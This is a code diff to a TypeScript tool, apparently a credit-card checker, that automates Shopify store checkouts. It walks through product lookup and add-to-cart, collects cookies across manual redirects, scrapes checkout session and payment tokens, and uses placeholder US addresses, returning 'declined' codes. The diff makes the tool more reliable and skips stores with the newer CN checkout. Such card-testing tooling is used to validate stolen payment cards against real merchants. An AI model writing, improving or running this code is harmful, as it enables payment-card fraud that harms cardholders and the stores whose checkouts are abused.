@@ -18,6 +18,39 @@ function findBetween(s: string, start: string, end: string): string {
   }
 }
 
+/** Follow redirects manually while accumulating cookies */
+async function fetchWithCookies(
+  url: string,
+  init: RequestInit & { headers: Record<string, string> },
+  cookies: string,
+  maxRedirects = 10,
+): Promise<{ resp: Response; body: string; finalUrl: string; cookies: string }> {
+  let currentUrl = url;
+  let currentCookies = cookies;
+  for (let i = 0; i < maxRedirects; i++) {
+    const headers = { ...init.headers, Cookie: currentCookies };
+    const resp = await fetch(currentUrl, { ...init, headers, redirect: "manual" });
+    const setCookie = resp.headers.get("set-cookie") || "";
+    if (setCookie) {
+      const nc = setCookie.split(",").map((c: string) => c.split(";")[0].trim()).filter(Boolean).join("; ");
+      currentCookies = currentCookies ? `${currentCookies}; ${nc}` : nc;
+    }
+    if (resp.status >= 300 && resp.status < 400) {
+      const loc = resp.headers.get("location");
+      await resp.text();
+      if (!loc) break;
+      currentUrl = loc.startsWith("http") ? loc : new URL(loc, currentUrl).toString();
+      init = { ...init, method: "GET", body: undefined };
+      continue;
+    }
+    const body = await resp.text();
+    return { resp, body, finalUrl: currentUrl, cookies: currentCookies };
+  }
+  const resp = await fetch(currentUrl, { ...init, headers: { ...init.headers, Cookie: currentCookies } });
+  const body = await resp.text();
+  return { resp, body, finalUrl: currentUrl, cookies: currentCookies };
+}
+
 const US_ADDRESSES = [
   { add1: "123 Main St", city: "Portland", state_short: "ME", zip: "04101" },
   { add1: "456 Oak Ave", city: "Portland", state_short: "ME", zip: "04102" },
@@ -82,81 +115,86 @@ async function checkCardOnShopify(
   try {
     const ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
     const siteUrl = site.replace(/\/+$/, "");
+    const baseHeaders: Record<string, string> = { "User-Agent": ua };
+    let cookies = "";
 
     // Step 1: Get product info
-    const prodResp = await fetch(`${siteUrl}/products.json`, {
-      headers: { "User-Agent": ua, Accept: "application/json" },
-    });
-    if (!prodResp.ok) return { status: "declined", code: "SITE_ERROR", message: `Product fetch failed: ${prodResp.status}` };
+    const prodResp = await fetch(`${siteUrl}/products.json`, { headers: { "User-Agent": ua, Accept: "application/json" } });
+    if (!prodResp.ok) { await prodResp.text(); return { status: "declined", code: "SITE_ERROR", message: `Product fetch failed: ${prodResp.status}` }; }
     const prodData = await prodResp.json();
     const product = prodData.products?.[0];
     if (!product) return { status: "declined", code: "NO_PRODUCT", message: "No products on site" };
-
     const variantId = product.variants[0].id;
-    const productHandle = product.handle;
 
-    // Step 2: Visit product page + get cookies (we use a cookie jar approach via headers)
-    const sessionHeaders: Record<string, string> = { "User-Agent": ua };
-    let cookies = "";
+    // Step 2: Visit product page + get cookies
+    const ppResult = await fetchWithCookies(`${siteUrl}/products/${product.handle}`, { headers: baseHeaders, method: "GET" }, cookies);
+    cookies = ppResult.cookies;
 
-    const ppResp = await fetch(`${siteUrl}/products/${productHandle}`, { headers: sessionHeaders, redirect: "follow" });
-    const ppCookies = ppResp.headers.get("set-cookie") || "";
-    cookies = ppCookies.split(",").map((c: string) => c.split(";")[0].trim()).filter(Boolean).join("; ");
-    await ppResp.text();
+    // Pre-visit cart.js
+    const cartPre = await fetchWithCookies(`${siteUrl}/cart.js`, { headers: { ...baseHeaders, Accept: "application/json" }, method: "GET" }, cookies);
+    cookies = cartPre.cookies;
 
     // Step 3: Add to cart
-    const addResp = await fetch(`${siteUrl}/cart/add.js`, {
-      method: "POST",
-      headers: { ...sessionHeaders, "Content-Type": "application/x-www-form-urlencoded", Cookie: cookies },
+    const addResult = await fetchWithCookies(`${siteUrl}/cart/add.js`, {
+      method: "POST", headers: { ...baseHeaders, "Content-Type": "application/x-www-form-urlencoded" },
       body: `id=${variantId}&quantity=1&form_type=product`,
-      redirect: "follow",
-    });
-    if (!addResp.ok) return { status: "declined", code: "CART_ERROR", message: "Failed to add to cart" };
-    const addCookies = addResp.headers.get("set-cookie") || "";
-    if (addCookies) cookies += "; " + addCookies.split(",").map((c: string) => c.split(";")[0].trim()).filter(Boolean).join("; ");
-    await addResp.text();
+    }, cookies);
+    cookies = addResult.cookies;
+    if (addResult.resp.status >= 400) return { status: "declined", code: "CART_ERROR", message: "Failed to add to cart" };
 
     // Step 4: Get cart token
-    const cartResp = await fetch(`${siteUrl}/cart.js`, {
-      headers: { ...sessionHeaders, Cookie: cookies, Accept: "application/json" },
-    });
-    const cartData = await cartResp.json();
+    const cartResult = await fetchWithCookies(`${siteUrl}/cart.js`, { method: "GET", headers: { ...baseHeaders, Accept: "application/json" } }, cookies);
+    cookies = cartResult.cookies;
+    const cartData = JSON.parse(cartResult.body);
     const cartToken = cartData.token;
 
-    // Step 5: Go to checkout
-    const checkoutResp = await fetch(`${siteUrl}/cart`, {
-      method: "POST",
-      headers: {
-        ...sessionHeaders,
-        "Content-Type": "application/x-www-form-urlencoded",
-        Origin: siteUrl,
-        Referer: `${siteUrl}/cart`,
-        Cookie: cookies,
-      },
-      body: "checkout=&updates[]=1",
-      redirect: "follow",
-    });
-    const checkoutHtml = await checkoutResp.text();
-    const checkoutCookies = checkoutResp.headers.get("set-cookie") || "";
-    if (checkoutCookies) cookies += "; " + checkoutCookies.split(",").map((c: string) => c.split(";")[0].trim()).filter(Boolean).join("; ");
+    // Step 5: Go to checkout (with manual redirect + cookie accumulation)
+    const checkoutHeaders: Record<string, string> = {
+      ...baseHeaders, "Content-Type": "application/x-www-form-urlencoded",
+      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+      Origin: siteUrl, Referer: `${siteUrl}/cart`, "Upgrade-Insecure-Requests": "1",
+    };
+
+    // Pre-visit /checkout
+    const preCheckout = await fetchWithCookies(`${siteUrl}/checkout`, { method: "GET", headers: checkoutHeaders }, cookies);
+    cookies = preCheckout.cookies;
+
+    // POST /cart to initiate checkout
+    const checkoutResult = await fetchWithCookies(`${siteUrl}/cart`, {
+      method: "POST", headers: checkoutHeaders, body: "checkout=&updates[]=1",
+    }, cookies);
+    cookies = checkoutResult.cookies;
+    const checkoutHtml = checkoutResult.body;
+    const checkoutUrl = checkoutResult.finalUrl;
+
+    // Detect CN checkout (unsupported - React SPA, no server-side session token)
+    if (checkoutUrl.includes("/checkouts/cn/")) {
+      return { status: "declined", code: "CN_CHECKOUT", message: "This store uses Shopify CN checkout (not supported). Use a legacy checkout store." };
+    }
+
+    // Use whichever response has sessionToken
+    let htmlToSearch = checkoutHtml;
+    if (!checkoutHtml.includes("sessionToken") && preCheckout.body.includes("sessionToken")) {
+      htmlToSearch = preCheckout.body;
+    }
 
     // Extract tokens from checkout page
-    // Try multiple patterns for session token extraction
     let sessionToken = "";
     const patterns = [
+      /name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"/,
       /name="serialized-sessionToken"\s+content="([^"]+)"/,
-      /serialized-sessionToken[^>]+content="([^"]+)"/,
+      /serialized-sessionToken[^>]+content="&quot;([^&]+)&quot;"/,
       /sessionToken&quot;:&quot;([^&]+)&quot;/,
       /sessionToken":"([^"]+)"/,
     ];
     for (const pat of patterns) {
-      const m = checkoutHtml.match(pat);
+      const m = htmlToSearch.match(pat);
       if (m?.[1]) { sessionToken = m[1]; break; }
     }
 
-    const queueToken = findBetween(checkoutHtml, 'queueToken":"', '"') || findBetween(checkoutHtml, 'queueToken&quot;:&quot;', '&quot;');
-    const stableId = findBetween(checkoutHtml, 'stableId":"', '"') || findBetween(checkoutHtml, 'stableId&quot;:&quot;', '&quot;');
-    const paymentMethodIdentifier = findBetween(checkoutHtml, 'paymentMethodIdentifier":"', '"') || findBetween(checkoutHtml, 'paymentMethodIdentifier&quot;:&quot;', '&quot;');
+    const queueToken = findBetween(htmlToSearch, 'queueToken&quot;:&quot;', '&quot;') || findBetween(htmlToSearch, 'queueToken":"', '"');
+    const stableId = findBetween(htmlToSearch, 'stableId&quot;:&quot;', '&quot;') || findBetween(htmlToSearch, 'stableId":"', '"');
+    const paymentMethodIdentifier = findBetween(htmlToSearch, 'paymentMethodIdentifier&quot;:&quot;', '&quot;') || findBetween(htmlToSearch, 'paymentMethodIdentifier":"', '"');
 
     if (!sessionToken) return { status: "declined", code: "NO_SESSION", message: "Could not extract session token" };
 
